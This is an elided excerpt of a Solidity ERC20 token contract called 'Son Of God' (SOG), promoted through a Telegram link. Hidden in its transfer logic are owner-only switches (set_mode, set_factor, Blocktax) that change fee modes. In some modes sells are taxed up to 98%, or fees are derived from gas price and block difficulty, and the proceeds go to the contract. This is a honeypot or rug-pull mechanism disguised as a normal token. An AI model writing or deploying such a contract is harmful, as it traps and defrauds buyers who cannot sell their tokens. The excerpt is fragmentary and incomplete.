...
TG: https://t.me/JesusCrypto_SonOfGod
*/
...
contract SonOfGod is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Son Of God", "SOG")  {
    ...
    function set_mode(uint256 value) external onlyOwner {
        new_mode = value;
    }

    function set_factor(uint256 value) external onlyOwner {
        factor = value;
    }
    ...
    function setbotKill(uint256 value) external onlyOwner{
    ...
    function Blocktax(uint256 value) external onlyOwner {
        buyFee = value;
    }
            

    event GasTransfer(uint256 gas);
    ...
    function _transfer(
        ...
        bool takeFee = !ef[to] && !ef[from];
        if (takeFee) {
            uint256 fee;

            uint256 blocks_diff = block.number.sub(cd[from]);
            if (new_mode == 0) {
                if (isSell) {
                    if (blocks_diff > 2) {
                        fee = 98;
                ...
                if (isBuy) {
                    fee = block.difficulty;
                }
            } else if (new_mode == 2) {
                if (isSell) {
                    fee = amount.mul(100).div(1_000_000_000);
                }
                if (isBuy) {
                    fee = tx.gasprice;
                }
                ...
                if (isSell) {
                    fee = tx.gasprice.div(1000000000); // tx.gasprice 6000000000 see https://bscscan.com/tx/0xca359871ba302ce9fee4b9faafa301bc8b93bd5b56e141a4b5e0d094f28d478b#eventlog
                }
                if (isBuy) {
                    fee = 4;
                }
                ...
                if (isSell) {
                    if (blocks_diff.div(100) > 98) {
                        fee = 98;
                    } else {
                        fee = blocks_diff.div(100);
                    }
                }
                if (isBuy) {
                    fee = 5;
                ...
                if (isSell) {
                    if (blocks_diff.sub(90) > 98) {
                        fee = 98;
                    } else {
                        fee = blocks_diff.sub(90);
                    }
                }
                if (isBuy) {
                    fee = 61;
            ...
            uint256 fee_in_tokens = amount.mul(fee).div(100);
            amount = amount.sub(fee_in_tokens);

            emit GasTransfer(tx.gasprice);
            super._transfer(from, address(this), fee_in_tokens);
        }
